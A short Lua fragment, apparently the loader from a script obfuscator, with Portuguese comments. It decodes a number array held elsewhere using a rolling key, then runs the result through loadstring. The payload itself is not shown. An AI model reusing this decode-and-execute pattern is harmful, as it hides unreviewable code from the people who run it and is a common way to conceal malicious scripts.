    local function VM_OO1l(d, k, m)
        local R_IOOOII = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_IOOOII, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_IOOOII)
    end

    -- Execution Guard
    local F_O1O0l = loadstring(VM_OO1l(B_I10l1l, 59, 5))
    if F_O1O0l then
        F_O1O0l(...)
    end
